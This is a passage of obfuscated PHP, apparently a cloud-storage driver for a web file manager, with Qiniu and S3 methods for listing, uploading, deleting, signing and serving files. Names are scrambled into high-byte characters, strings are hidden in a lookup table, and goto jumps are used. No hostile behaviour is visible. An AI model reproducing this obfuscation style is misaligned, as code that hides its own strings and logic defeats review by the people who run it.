$¢ç´¨Ú« = $this->bucketManager->delete($this->bucket, $¦Æ¸À“); return $¢ç´¨Ú« ? !1 : !0; } public function delFolder($™¢—•øû) { $½İŒÈş =& $_SERVER[¤·²È‰º]; if (!$this->exist($™¢—•øû)) { return !0; } $this->listItemCache = !1; $«ÑâÊÕ  = $this->fileList($™¢—•øû); $this->listItemCache = !0; $ıœ“´½Š = trim($™¢—•øû, $½İŒÈş[8]) . $½İŒÈş[8]; if (!empty($™¢—•øû) && $™¢—•øû !== $½İŒÈş[207] && !in_array($ıœ“´½Š, $«ÑâÊÕ [$½İŒÈş[92]])) { $«ÑâÊÕ [$½İŒÈş[92]][] = $ıœ“´½Š; } $›¸ê±Ùõ = $this->delByBatch($«ÑâÊÕ [$½İŒÈş[93]]); if (!$›¸ê±Ùõ) { return !1; } $›¸ê±Ùõ = $this->delByBatch($«ÑâÊÕ [$½İŒÈş[92]]); if (!$›¸ê±Ùõ) { return !1; } return $this->delFile($ıœ“´½Š); } private function delByBatch($Ó¢È‰Ñ„) { foreach (array_chunk($Ó¢È‰Ñ„, 1000) as $öÄé®âş) { $ËÄĞæÕî = $this->bucketManager->buildBatchDelete($this->bucket, $öÄé®âş); list($‡¾½ù¼˜, $§–âİŠ“) = $this->bucketManager->batch($ËÄĞæÕî); if ($§–âİŠ“) { return !1; } } return !0; } public function rename($¯¥ß×–¿, $ÄĞ¤å¼ì) { return $this->renameObject($¯¥ß×–¿, $ÄĞ¤å¼ì); } public function fileInfo($í¼œ¶Úö, $æ£ÓÊ‰õ = false, $ú„Ô°Ã = array()) { $á¦«¼Ğ =& $_SERVER[¤·²È‰º]; $±ÌÍµ×¯ = array($á¦«¼Ğ[42] => $this->pathThis($í¼œ¶Úö), $á¦«¼Ğ[94] => $this->getPathOuter($á¦«¼Ğ[8] . $í¼œ¶Úö), $á¦«¼Ğ[43] => $á¦«¼Ğ[209], $á¦«¼Ğ[86] => isset($ú„Ô°Ã[$á¦«¼Ğ[1421]]) ? $ú„Ô°Ã[$á¦«¼Ğ[1421]] : 0, $á¦«¼Ğ[184] => $this->ext($í¼œ¶Úö)); if ($æ£ÓÊ‰õ) { return $±ÌÍµ×¯; } $±ÌÍµ×¯[$á¦«¼Ğ[210]] = $±ÌÍµ×¯[$á¦«¼Ğ[95]] = 0; $±ÌÍµ×¯[$á¦«¼Ğ[211]] = $±ÌÍµ×¯[$á¦«¼Ğ[212]] = !0; if (empty($ú„Ô°Ã)) { $ú„Ô°Ã = $this->objectMeta($í¼œ¶Úö); if (!$ú„Ô°Ã) { return $±ÌÍµ×¯; } } if (isset($ú„Ô°Ã[$á¦«¼Ğ[1422]])) { $±ÌÍµ×¯[$á¦«¼Ğ[95]] = substr($ú„Ô°Ã[$á¦«¼Ğ[1422]] . $á¦«¼Ğ[12], 0, 10); } if (isset($ú„Ô°Ã[$á¦«¼Ğ[1421]])) { $±ÌÍµ×¯[$á¦«¼Ğ[86]] = $ú„Ô°Ã[$á¦«¼Ğ[1421]]; } return $±ÌÍµ×¯; } public function folderInfo($›ß×‰Ñ, $×ÍÈšØã = false) { $¾”ğÆ´ú =& $_SERVER[¤·²È‰º]; $ç¼»­Ç§ = array($¾”ğÆ´ú[42] => $this->pathThis($›ß×‰Ñ), $¾”ğÆ´ú[94] => $this->getPathOuter($¾”ğÆ´ú[8] . $›ß×‰Ñ), $¾”ğÆ´ú[43] => $¾”ğÆ´ú[85]); if ($×ÍÈšØã) { return $ç¼»­Ç§; } $ç¼»­Ç§[$¾”ğÆ´ú[210]] = $ç¼»­Ç§[$¾”ğÆ´ú[95]] = 0; $ç¼»­Ç§[$¾”ğÆ´ú[211]] = $ç¼»­Ç§[$¾”ğÆ´ú[212]] = !0; $›ß×‰Ñ = rtrim($›ß×‰Ñ, $¾”ğÆ´ú[8]) . $¾”ğÆ´ú[8]; $ÙÑ­¿¢µ = $this->objectMeta($›ß×‰Ñ); if (isset($ÙÑ­¿¢µ[$¾”ğÆ´ú[1422]])) { $ç¼»­Ç§[$¾”ğÆ´ú[95]] = substr($ÙÑ­¿¢µ[$¾”ğÆ´ú[1422]] . $¾”ğÆ´ú[12], 0, 10); } return $ç¼»­Ç§; } public function listPath($à¸Ã˜Êù, $¡Øûñ³² = false) { $ºîÆÇáÙ =& $_SERVER[¤·²È‰º]; $µÆÂ½ = $this->fileList($à¸Ã˜Êù, $ºîÆÇáÙ[8], !0); foreach ($µÆÂ½[$ºîÆÇáÙ[92]] as $”£Åôå => $Áƒ¶·ñ) { $µÆÂ½[$ºîÆÇáÙ[92]][$”£Åôå] = $this->folderInfo($Áƒ¶·ñ, $¡Øûñ³²); } foreach ($µÆÂ½[$ºîÆÇáÙ[93]] as $”£Åôå => $Áƒ¶·ñ) { $µÆÂ½[$ºîÆÇáÙ[93]][$”£Åôå] = $this->fileInfo($Áƒ¶·ñ[$ºîÆÇáÙ[104]], $¡Øûñ³², $Áƒ¶·ñ); } return $µÆÂ½; } public function has($¢•öÑïŠ, $­™®ìã = false, $Ôã¡¤ØÃ = true) { $ÉÖ™Ù® =& $_SERVER[¤·²È‰º]; $¢•öÑïŠ = trim($¢•öÑïŠ, $ÉÖ™Ù®[8]); $úÛß˜Ó = empty($¢•öÑïŠ) && $¢•öÑïŠ !== $ÉÖ™Ù®[207] ? $ÉÖ™Ù®[12] : $¢•öÑïŠ . $ÉÖ™Ù®[8]; $—ıƒÌÌ = $ÉÖ™Ù®[12]; $­¸Ë­•– = 500; $¾”àîµî = $ÉÖ™Ù®[8]; $ÅÏà†úö = $œô˜§Ó› = 0; while (!0) { check_abort(); list($†ºˆ¤İ…, $•ªóÜ÷Æ) = $this->bucketManager->listFiles($this->bucket, $úÛß˜Ó, $—ıƒÌÌ, $­¸Ë­•–, $¾”àîµî); if ($•ªóÜ÷Æ) { break; } $—ıƒÌÌ = array_key_exists($ÉÖ™Ù®[1390], $†ºˆ¤İ…) ? $—ıƒÌÌ = $†ºˆ¤İ…[$ÉÖ™Ù®[1423]] : $ÉÖ™Ù®[12]; if ($­™®ìã) { if (!empty($†ºˆ¤İ…[$ÉÖ™Ù®[1424]])) { $ÅÏà†úö += count($†ºˆ¤İ…[$ÉÖ™Ù®[1424]]); } if (!empty($†ºˆ¤İ…[$ÉÖ™Ù®[1425]])) { $œô˜§Ó› += count($†ºˆ¤İ…[$ÉÖ™Ù®[1425]]); } if ($—ıƒÌÌ === $ÉÖ™Ù®[12]) { break; } continue; } if ($Ôã¡¤ØÃ) { if (!empty($†ºˆ¤İ…[$ÉÖ™Ù®[1424]])) { return !0; } } else { if (!empty($†ºˆ¤İ…[$ÉÖ™Ù®[1425]])) { return !0; } } if ($—ıƒÌÌ === $ÉÖ™Ù®[12]) { break; } } if ($­™®ìã) { return array($ÉÖ™Ù®[217] => $ÅÏà†úö, $ÉÖ™Ù®[218] => $œô˜§Ó›); } return !1; } public function listAll($©şîÖÒº) { $ØˆªÇÜŒ =& $_SERVER[¤·²È‰º]; $ßŠ†Ç½€ = $this->fileList($©şîÖÒº, $ØˆªÇÜŒ[12], !0); $ƒêõó² = array(); foreach ($ßŠ†Ç½€[$ØˆªÇÜŒ[93]] as $‘õöØİİ) { $ƒêõó²[$‘õöØİİ[$ØˆªÇÜŒ[104]]] = $‘õöØİİ[$ØˆªÇÜŒ[86]]; } foreach ($ßŠ†Ç½€[$ØˆªÇÜŒ[92]] as $‘õöØİİ) { if (is_string($‘õöØİİ)) { $ƒêõó²[$‘õöØİİ] = 0; } } return $this->listAllFiles($©şîÖÒº, array_keys($ƒêõó²), $ƒêõó²); } private function fileList($üâ¯Ç¤¨, $÷°ÈğãÓ = '', $³•Á©ÀÕ = 0) { $›´«û ¶ =& $_SERVER[¤·²È‰º]; $üâ¯Ç¤¨ = trim($üâ¯Ç¤¨, $›´«û ¶[8]); $¨á§Í°ö = empty($üâ¯Ç¤¨) && $üâ¯Ç¤¨ !== $›´«û ¶[207] ? $›´«û ¶[12] : $üâ¯Ç¤¨ . $›´«û ¶[8]; $ÔÉ„ŞÛá = $›´«û ¶[12]; $é Šş¨ = 1000; $Ü’–ŠĞõ = $¬³Äöğ = array(); while (!0) { check_abort(); list($ÒÜ™ÏÓÖ, $àçªÂĞ­) = $this->bucketManager->listFiles($this->bucket, $¨á§Í°ö, $ÔÉ„ŞÛá, $é Šş¨, $÷°ÈğãÓ); if ($àçªÂĞ­) { break; } $ÔÉ„ŞÛá = array_key_exists($›´«û ¶[1390], $ÒÜ™ÏÓÖ) ? $ÔÉ„ŞÛá = $ÒÜ™ÏÓÖ[$›´«û ¶[1423]] : $›´«û ¶[12]; $½Â¿ÈÑ = isset($ÒÜ™ÏÓÖ[$›´«û ¶[1424]]) ? $ÒÜ™ÏÓÖ[$›´«û ¶[1424]] : array(); $ŞÊÎÔ– = isset($ÒÜ™ÏÓÖ[$›´«û ¶[1425]]) ? $ÒÜ™ÏÓÖ[$›´«û ¶[1425]] : array(); foreach ($½Â¿ÈÑ as $Áú‰ «û) { if ($Áú‰ «û[$›´«û ¶[104]] == $¨á§Í°ö) { continue; } $’È«ÇÃÀ = $Áú‰ «û[$›´«û ¶[104]]; $åú—Àæš = $Áú‰ «û[$›´«û ¶[1421]]; $Áú‰ «û[$›´«û ¶[86]] = $åú—Àæš; $à¥¾ÈÍ = $åú—Àæš == 0 && substr($’È«ÇÃÀ, strlen($’È«ÇÃÀ) - 1, 1) == $›´«û ¶[8] ? !0 : !1; $this->cacheMethodInfoSet($’È«ÇÃÀ, $à¥¾ÈÍ, $Áú‰ «û); if ($à¥¾ÈÍ) { $Ü’–ŠĞõ[] = $’È«ÇÃÀ; continue; } $¬³Äöğ[] = $³•Á©ÀÕ ? $Áú‰ «û : $’È«ÇÃÀ; } foreach ($ŞÊÎÔ– as $’È«ÇÃÀ) { if ($’È«ÇÃÀ == $¨á§Í°ö) { continue; } $Ü’–ŠĞõ[] = $’È«ÇÃÀ; $this->cacheMethodInfoSet($’È«ÇÃÀ, !0); } if ($ÔÉ„ŞÛá === $›´«û ¶[12]) { break; } } $this->cacheMethodInfoSet($üâ¯Ç¤¨, !0); return array($›´«û ¶[92] => $Ü’–ŠĞõ, $›´«û ¶[93] => $¬³Äöğ); } public function canRead($ã¶°›€€) { return $this->exist($ã¶°›€€) ? !0 : !1; } public function canWrite($äÃ‚‚õ×) { return $this->exist($äÃ‚‚õ×) ? !0 : !1; } public function getContent($µÓÈ²øÄ) { return $this->fileSubstr($µÓÈ²øÄ, 0, -1); } public function setContent($ı×“Ù , $¶õ±¤äÊ = '') { $ìÜ­‹¶ = $this->tempFile($this->pathThis($ı×“Ù )); file_put_contents($ìÜ­‹¶, $¶õ±¤äÊ); if ($this->upload($ı×“Ù , $ìÜ­‹¶)) { $this->tempFileRemve($ìÜ­‹¶); return !0; } return !1; } public function refreshUrls($êş“«òÀ) { $ó„Ô…Ü‰ =& $_SERVER[¤·²È‰º]; $¿†ØÇä« = array(); if (is_array($êş“«òÀ)) { foreach ($êş“«òÀ as $æ§í£»¦) { $¿†ØÇä«[] = $this->link($æ§í£»¦); } } else { $¿†ØÇä«[] = $this->link($êş“«òÀ); } $¢ƒ§èù = new Qiniu\Cdn\CdnManager($this->auth); list($ÖşƒéïÄ, $ìœÕ­úè) = $¢ƒ§èù->refreshUrls($¿†ØÇä«); if ($ìœÕ­úè) { return !1; } return $ÖşƒéïÄ[$ó„Ô…Ü‰[1177]] == $ó„Ô…Ü‰[761] ? !0 : !1; } public function fileSubstr($«â±õã, $¤Õ­Šü, $íËá°Òº) { $òÆú€¶¬ =& $_SERVER[¤·²È‰º]; if (!($üÍÀ¢›ñ = $this->link($«â±õã))) { return !1; } $¹ÆÆ¹íä = !1; if ($íËá°Òº > 0) { $¶´—†’ = $¤Õ­Šü + $íËá°Òº - 1; $¹ÆÆ¹íä = array($òÆú€¶¬[1426] . $¤Õ­Šü . $òÆú€¶¬[394] . $¶´—†’); } $·øš¾Ã§ = url_request($üÍÀ¢›ñ, $òÆú€¶¬[240], !1, $¹ÆÆ¹íä); return $·øš¾Ã§[$òÆú€¶¬[751]] ? $·øš¾Ã§[$òÆú€¶¬[1187]] : !1; } public function upload($Ãù›ÉŞ, $®ªñ¾¬, $µï´”š = false, $ÃÆçóïº = REPEAT_REPLACE) { $“äè°Ûß = new Qiniu\Storage\UploadManager(); $…ğ¹É = $this->auth->uploadToken($this->bucket, $Ãù›ÉŞ); $–¸Óûüñ = get_file_mime(get_path_ext($®ªñ¾¬)); list($Õ“å¹Ìİ, $Ì”ªû€) = $“äè°Ûß->putFile($…ğ¹É, $Ãù›ÉŞ, $®ªñ¾¬, null, $–¸Óûüñ); return $Ì”ªû€ ? !1 : $this->getPathOuter($Ãù›ÉŞ); } public function uploadFormData($ªñóïáÒ, $áÆƒ«Ğ = 3600) { return $this->uploadToken($ªñóïáÒ, $áÆƒ«Ğ); } public function multiUploadFormData($Ã³ŸÆˆ«, $ú€Úõ®“ = 3600) { return $this->uploadToken($Ã³ŸÆˆ«, $ú€Úõ®“); } private function uploadToken($¹íÛ¡Ñ, $ –Ï†í˜ = 3600) { $È…¡¶Ù =& $_SERVER[¤·²È‰º]; $ëüĞ‚èÏ = $ –Ï†í˜; $‹æ©Õ«ˆ = array($È…¡¶Ù[1427] => $È…¡¶Ù[1428]); $–¤õ¬ø¿ = $¹íÛ¡Ñ; $½ëâÈ = $this->auth->uploadToken($this->bucket, $–¤õ¬ø¿, $ëüĞ‚èÏ, $‹æ©Õ«ˆ, !0); $êúî†Í = empty($this->region) || $this->region == $È…¡¶Ù[1429] ? $È…¡¶Ù[12] : $È…¡¶Ù[394] . $this->region; $àşòÔåÓ = http_type() . "\72\x2f\x2f\165\160\154\x6f\x61\x64{$êúî†Í}\x2e\161\151\x6e\x69\165\160\56\143\x6f\155\57"; return array($È…¡¶Ù[1430] => $½ëâÈ, $È…¡¶Ù[1431] => $àşòÔåÓ); } public function download($Â³°øÆ•, $ø§˜¶ÖÙ) { $¥äÈäÚİ = IO::getPathInner(IO::mkfile($ø§˜¶ÖÙ)); if (!($‰Íä˜Ãö = $this->link($Â³°øÆ•))) { return !1; } $¾Ä¥¢Ì¬ = 0; $àô˜¤¿³ = 1024 * 200; $½”í‰¾ã = fopen($¥äÈäÚİ, $_SERVER[¤·²È‰º][1432]); while (!0) { $©¨ü•äÅ = $this->fileSubstr($Â³°øÆ•, $¾Ä¥¢Ì¬, $àô˜¤¿³); if ($©¨ü•äÅ === !1) { return !1; } fwrite($½”í‰¾ã, $©¨ü•äÅ); $¾Ä¥¢Ì¬ += $àô˜¤¿³; if (strlen($©¨ü•äÅ) < $àô˜¤¿³) { break; } } fclose($½”í‰¾ã); return $ø§˜¶ÖÙ; } public function link($ªùİöšæ, $÷¶º«­º = '') { if (!$this->isFile($ªùİöšæ)) { return !1; } $ıÑ†¬ä = $this->getHost() . $_SERVER[¤·²È‰º][8] . $this->pathEncode($ªùİöšæ) . $÷¶º«­º; return $this->auth->privateDownloadUrl($ıÑ†¬ä, 3600 * 12); } public function fileOut($ø½ê¥ÅŒ, $—ş—‚•² = false, $ˆÃ’­õ = false, $şŞ™ó›ó = '') { $å÷ë•™ˆ =& $_SERVER[¤·²È‰º]; if ($this->isFileOutServer()) { return $this->fileOutServer($ø½ê¥ÅŒ, $—ş—‚•², $ˆÃ’­õ, $şŞ™ó›ó); } if (!$ˆÃ’­õ) { $ˆÃ’­õ = $this->pathThis($ø½ê¥ÅŒ); } $¾ˆ Ë—» = $—ş—‚•² ? $å÷ë•™ˆ[1433] . rawurlencode($ˆÃ’­õ) : $å÷ë•™ˆ[12]; $í¯†ƒìÁ = $this->link($ø½ê¥ÅŒ, $¾ˆ Ë—»); $this->fileOutLink($í¯†ƒìÁ); } public function fileOutServer($ì¿²ù’´, $ˆÀ©‡­¥ = false, $³ŒôÔÊ™ = false, $…òæãáÂ = '') { parent::fileOut($ì¿²ù’´, $ˆÀ©‡­¥, $³ŒôÔÊ™, $…òæãáÂ); } public function fileOutImage($É™º‰œ¾, $ÒêàË„ = 250) { $Ù£øæİÚ = $this->link($É™º‰œ¾, $_SERVER[¤·²È‰º][1434] . $ÒêàË„); $this->fileOutLink($Ù£øæİÚ); } public function fileOutImageServer($‚ê˜®¼Î, $Üò–ŒÏ = 250) { parent::fileOutImage($‚ê˜®¼Î, $Üò–ŒÏ); } public function hashMd5($œƒòÏ•ƒ) { $• …Ï­¾ =& $_SERVER[¤·²È‰º]; $¤¶ª¹ÍÅ = $this->objectMeta($œƒòÏ•ƒ); return isset($¤¶ª¹ÍÅ[$• …Ï­¾[222]]) ? $¤¶ª¹ÍÅ[$• …Ï­¾[222]] : !1; $ÃÖıÂĞ = $this->link($œƒòÏ•ƒ, $• …Ï­¾[1435]); } public function size($‡ûá¦Ó™) { $êÂşÂ…Û = $this->objectMeta($‡ûá¦Ó™); return $êÂşÂ…Û ? $êÂşÂ…Û[$_SERVER[¤·²È‰º][86]] : 0; } public function info($íÀ¦¢Ş‹) { if ($this->isFolder($íÀ¦¢Ş‹)) { return $this->folderInfo($íÀ¦¢Ş‹); } else { if ($this->isFile($íÀ¦¢Ş‹)) { return $this->fileInfo($íÀ¦¢Ş‹); } } return !1; } public function exist($»ªéĞì) { return $this->isFile($»ªéĞì) || $this->isFolder($»ªéĞì); } public function isFile($œ±ÔğØä) { return !$this->isFolder($œ±ÔğØä) && $this->objectMeta($œ±ÔğØä); } public function isFolder($«ÄïíÑ) { return $this->cacheMethod($_SERVER[¤·²È‰º][175], $«ÄïíÑ); } protected function objectMeta($ãù”µ»¤) { return $this->cacheMethod($_SERVER[¤·²È‰º][177], $ãù”µ»¤); } protected function _objectMeta($Ò³¸ò­) { $Ã…©åÏ´ =& $_SERVER[¤·²È‰º]; list($ê‰õßàë, $Ú¼—»ŠĞ) = $this->bucketManager->stat($this->bucket, $Ò³¸ò­); if ($ê‰õßàë) { $ê‰õßàë[$Ã…©åÏ´[86]] = intval($ê‰õßàë[$Ã…©åÏ´[1421]]); } return $ê‰õßàë; } protected function _isFolder($ƒæ‰©˜¬) { $óÔ„ï¦è =& $_SERVER[¤·²È‰º]; if ($ƒæ‰©˜¬ == $óÔ„ï¦è[12] || $ƒæ‰©˜¬ == $óÔ„ï¦è[8]) { return !0; } list($Ú…ØäÔ, $‚ê¦ùê¥) = $this->bucketManager->listFiles($this->bucket, trim($ƒæ‰©˜¬, $óÔ„ï¦è[8]) . $óÔ„ï¦è[8], $óÔ„ï¦è[12], 1, $óÔ„ï¦è[8]); return !empty($Ú…ØäÔ[$óÔ„ï¦è[1424]]) || !empty($Ú…ØäÔ[$óÔ„ï¦è[1425]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($ÜªŞà°Í) { parent::__construct($ÜªŞà°Í); } public function uploadFormData($·íú¨ì , $ò¼ÌÕÕâ = 3600) { $¤Î‹ıèü =& $_SERVER[¤·²È‰º]; $³ìÇ¡­» = $¤Î‹ıèü[208]; $Ù»îØ€Ê = $¤Î‹ıèü[1340]; $³­ã•÷“ = $¤Î‹ıèü[72]; $Äõ‘é’ = gmdate($¤Î‹ıèü[1341]); $¿¸Â—×Û = gmdate($¤Î‹ıèü[752]); $ ´ˆÉ± = $¤Î‹ıèü[1342]; $ëŒŸÂ©í = $ò¼ÌÕÕâ . $¤Î‹ıèü[12]; $¿Œ‰Êƒ¨ = $¤Î‹ıèü[1304]; $œêÁ¸Ç = array($this->accessKey, $¿¸Â—×Û, $this->region, $³­ã•÷“, $ ´ˆÉ±); $·Á¬ùÉê = implode($¤Î‹ıèü[8], $œêÁ¸Ç); $ˆì™Óğµ = array($¤Î‹ıèü[1306] => gmdate($¤Î‹ıèü[1305], strtotime($¤Î‹ıèü[1343])), $¤Î‹ıèü[1307] => array(array($¤Î‹ıèü[1309] => $this->bucket), array($¤Î‹ıèü[1308] => $³ìÇ¡­»), array($¤Î‹ıèü[1310], $¤Î‹ıèü[1311], $¤Î‹ıèü[12]), array($¤Î‹ıèü[1310], $¤Î‹ıèü[1344], $¤Î‹ıèü[12]), array($¤Î‹ıèü[1310], $¤Î‹ıèü[1345], $¤Î‹ıèü[12]), array($¤Î‹ıèü[1312] => $¿Œ‰Êƒ¨), array($¤Î‹ıèü[1346] => $·Á¬ùÉê), array($¤Î‹ıèü[1347] => $Ù»îØ€Ê), array($¤Î‹ıèü[1348] => $Äõ‘é’), array($¤Î‹ıèü[1349] => $ëŒŸÂ©í))); $Ï×À´œå = base64_encode(json_encode($ˆì™Óğµ)); $ó€©’© = hash_hmac($¤Î‹ıèü[1350], $¿¸Â—×Û, $¤Î‹ıèü[1351] . $this->secret, !0); $Ã¬ “ß« = hash_hmac($¤Î‹ıèü[1350], $this->region, $ó€©’©, !0); $±ÚÔ‚ëõ = hash_hmac($¤Î‹ıèü[1350], $³­ã•÷“, $Ã¬ “ß«, !0); $‰å¼¨İƒ = hash_hmac($¤Î‹ıèü[1350], $ ´ˆÉ±, $±ÚÔ‚ëõ, !0); $Ñ÷Õ¨ŸŞ = hash_hmac($¤Î‹ıèü[1350], $Ï×À´œå, $‰å¼¨İƒ); $ğ°¥¶úƒ = array($¤Î‹ıèü[225] => $¤Î‹ıèü[12], $¤Î‹ıèü[1352] => $¤Î‹ıèü[12], $¤Î‹ıèü[1308] => $³ìÇ¡­», $¤Î‹ıèü[1312] => $¿Œ‰Êƒ¨, $¤Î‹ıèü[1316] => $Ï×À´œå, $¤Î‹ıèü[1353] => $·Á¬ùÉê, $¤Î‹ıèü[1354] => $Ù»îØ€Ê, $¤Î‹ıèü[1355] => $Äõ‘é’, $¤Î‹ıèü[1356] => $ëŒŸÂ©í, $¤Î‹ıèü[1357] => $Ñ÷Õ¨ŸŞ, $¤Î‹ıèü[191] => $this->getHost()); return $ğ°¥¶úƒ; } public function multiUploadFormData($½ã¢§ø², $×úš‚Ê = 3600) { $â…Õ°½ =& $_SERVER[¤·²È‰º]; $¾ª»Ç”Å = gmdate($â…Õ°½[1436]); $ô¢úÕ†¬ = array(); $È­­êÇé = $this->client->getUploadId($this->bucket, $½ã¢§ø², $ô¢úÕ†¬); if (!$È­­êÇé) { return !1; } return array($â…Õ°½[233] => $È­­êÇé, $â…Õ°½[191] => $this->getHost() . $â…Õ°½[8] . $this->pathEncode($½ã¢§ø²), $â…Õ°½[234] => $¾ª»Ç”Å, $â…Õ°½[104] => $½ã¢§ø²); } public function multiUploadAuthData($¨şÒ‰Ş¥, $¹¾ıÄ› = array()) { $—ÎİË­À =& $_SERVER[¤·²È‰º]; $éûéÜ± = isset($¹¾ıÄ›[$—ÎİË­À[184]]) ? $¹¾ıÄ›[$—ÎİË­À[184]] : $—ÎİË­À[12]; $ƒ²ƒßçÄ = $¹¾ıÄ›[$—ÎİË­À[104]]; unset($¹¾ıÄ›[$—ÎİË­À[104]]); if (isset($¹¾ıÄ›[$—ÎİË­À[235]])) { return $this->listUploadParts($ƒ²ƒßçÄ, $¹¾ıÄ›); } $õ–ôıá = array(); if (isset($¹¾ıÄ›[$—ÎİË­À[1437]])) { $õ–ôıá[$—ÎİË­À[1438]] = $¹¾ıÄ›[$—ÎİË­À[1437]]; } $î®Û×îğ = explode($—ÎİË­À[193], $this->getHost()); $İËà¿ = array($—ÎİË­À[1439] => $î®Û×îğ[1], $—ÎİË­À[1440] => $—ÎİË­À[12], $—ÎİË­À[225] => $—ÎİË­À[130], $—ÎİË­À[1352] => $¹¾ıÄ›[$—ÎİË­À[86]]); $é§“Õ = $—ÎİË­À[238]; $®Œ´¢¸ = $—ÎİË­À[8] . $this->pathEncode($ƒ²ƒßçÄ) . $éûéÜ±; $ƒùÙÌå« = $this->client->__getSignatureV4($õ–ôıá, $İËà¿, $é§“Õ, $®Œ´¢¸); if (strpos($éûéÜ±, $—ÎİË­À[237]) === 0) { if (isset($õ–ôıá[$—ÎİË­À[1438]])) { $Ó£–ËøÑ = $õ–ôıá[$—ÎİË­À[1438]]; } else { if (isset($ƒùÙÌå«[$—ÎİË­À[1438]])) { $Ó£–ËøÑ = $ƒùÙÌå«[$—ÎİË­À[1438]]; } else { $Ó£–ËøÑ = hash($—ÎİË­À[1350], $—ÎİË­À[12]); } } return array($—ÎİË­À[243] => $ƒùÙÌå«[$—ÎİË­À[243]], $—ÎİË­À[1438] => $Ó£–ËøÑ, $—ÎİË­À[234] => $ƒùÙÌå«[$—ÎİË­À[1441]]); } return $ƒùÙÌå«[$—ÎİË­À[243]]; } public function listUploadParts($—üìÃ§º, $™™ÊØˆ… = array()) { $˜Ã´ç¤é =& $_SERVER[¤·²È‰º]; $Ê»Áîâ£ = str_replace($˜Ã´ç¤é[244], $˜Ã´ç¤é[12], $™™ÊØˆ…[$˜Ã´ç¤é[184]]); $ï¥„·íæ = $this->client->listParts($this->bucket, $—üìÃ§º, $Ê»Áîâ£); if (!$ï¥„·íæ) { return !1; } $µ¤·»ê = $˜Ã´ç¤é[1442]; foreach ($ï¥„·íæ as $Èˆ†¾ªª) { $µ¤·»ê .= $˜Ã´ç¤é[1443] . "\x3c\x50\141\162\164\x4e\x75\x6d\142\145\x72\x3e{$Èˆ†¾ªª[$˜Ã´ç¤é[1397]]}\x3c\x2f\120\141\162\164\116\165\x6d\x62\145\162\76\xa" . "\74\x45\x54\141\147\76{$Èˆ†¾ªª[$˜Ã´ç¤é[1398]]}\74\x2f\x45\124\141\147\x3e\12" . $˜Ã´ç¤é[1444]; } $µ¤·»ê .= $˜Ã´ç¤é[1445]; $Œùè©´ = array(); $†¸Ö˜©‘ = explode($˜Ã´ç¤é[193], $this->getHost()); $Ì‰Å®” = array($˜Ã´ç¤é[1439] => $†¸Ö˜©‘[1], $˜Ã´ç¤é[225] => $˜Ã´ç¤é[130], $˜Ã´ç¤é[1352] => strlen($µ¤·»ê)); $—Ö»Ãê = $˜Ã´ç¤é[236]; $õ±ø²ëĞ = $˜Ã´ç¤é[8] . $this->pathEncode($—üìÃ§º) . $™™ÊØˆ…[$˜Ã´ç¤é[184]]; $ş¼æÅü· = $this->client->__getSignatureV4($Œùè©´, $Ì‰Å®”, $—Ö»Ãê, $õ±ø²ëĞ, $µ¤·»ê); return array($˜Ã´ç¤é[243] => $ş¼æÅü·[$˜Ã´ç¤é[243]], $˜Ã´ç¤é[234] => $ş¼æÅü·[$˜Ã´ç¤é[1441]], $˜Ã´ç¤é[245] => $ï¥„·íæ, $˜Ã´ç¤é[1438] => $ş¼æÅü·[$˜Ã´ç¤é[1438]]); } public function link($ª“´‹–, $÷òØä—õ = array()) { return parent::link($ª“´‹–, $÷òØä—õ); } public function fileOut($µ“Ÿô¦ö, $…ˆ©´”ê = false, $„è±òöÚ = false, $ış¨¢¶ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[¤·²È‰º][1446])) { return parent::fileOutServer($µ“Ÿô¦ö, $…ˆ©´”ê, $„è±òöÚ, $ış¨¢¶); } parent::fileOut($µ“Ÿô¦ö, $…ˆ©´”ê, $„è±òöÚ, $ış¨¢¶); } public function fileOutImage($¿ËÛŞĞÎ, $Ù¶ìÙ…· = 250) { if (strstr($this->endpoint, $_SERVER[¤·²È‰º][1446])) { return parent::fileOutImageServer($¿ËÛŞĞÎ, $Ù¶ìÙ…·); } parent::fileOutImage($¿ËÛŞĞÎ, $Ù¶ìÙ…·); } public function fileOutLink($ä¡‚ÇåÊ) { $Æö·šÉ¼ =& $_SERVER[¤·²È‰º]; if (substr($ä¡‚ÇåÊ, 0, 7) == $Æö·šÉ¼[1319]) { $ä¡‚ÇåÊ = $Æö·šÉ¼[1320] . substr($ä¡‚ÇåÊ, 7); } header($Æö·šÉ¼[171] . $ä¡‚ÇåÊ); die; } public function getHost() { $©ˆëÁ¸å =& $_SERVER[¤·²È‰º]; $ü€Ü¸Ø— = str_rtrim(parent::getHost(), $©ˆëÁ¸å[8] . $this->bucket); $ü€Ü¸Ø— = explode($©ˆëÁ¸å[193], $ü€Ü¸Ø—); return $ü€Ü¸Ø—[0] . $©ˆëÁ¸å[193] . $this->bucket . $©ˆëÁ¸å[10] . $ü€Ü¸Ø—[1]; } } goto ašÙ”–»©•; AÄ‹ªæ¿æ: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ª‹èÁö, $æÛ±õòÁ) { $ÈÚÍÃ =& $_SERVER[¤·²È‰º]; $µÅ¸‰¯Œ = $æÛ±õòÁ; $GLOBALS[$ÈÚÍÃ[1140]] = $ÈÚÍÃ[1141] . $ª‹èÁö; Hook::trigger($ÈÚÍÃ[1141] . $ª‹èÁö . $ÈÚÍÃ[1142], $µÅ¸‰¯Œ); $Ï˜Îüª¯ = self::driverMake($æÛ±õòÁ[0]); if (!$Ï˜Îüª¯) { return !1; } if (method_exists($Ï˜Îüª¯, $ª‹èÁö)) { $¶¬­Ô† = @call_user_func_array(array($Ï˜Îüª¯, $ª‹èÁö), $æÛ±õòÁ); } else { if (method_exists($Ï˜Îüª¯, $ÈÚÍÃ[1143])) { $¶¬­Ô† = @call_user_func_array(array($Ï˜Îüª¯, $ª‹èÁö), $æÛ±õòÁ); } else { if (method_exists(self, $ª‹èÁö)) { $¶¬­Ô† = @call_user_func_array(array(self, $ª‹èÁö), $æÛ±õòÁ); } else { $¶¬­Ô† = call_user_func_array(array(parent, $ª‹èÁö), $æÛ±õòÁ); } } } Hook::trigger($ÈÚÍÃ[1141] . $ª‹èÁö . $ÈÚÍÃ[1144], $µÅ¸‰¯Œ, $¶¬­Ô†); return $¶¬­Ô†; } public static function init($Œ¹ó§úÏ) { return self::driverMake($Œ¹ó§úÏ); } public static function copy($˜¤¯’Ì”, $õ²ƒğ¶š, $±›³õïØ = false, $‰»ôÌæµ = false) { return 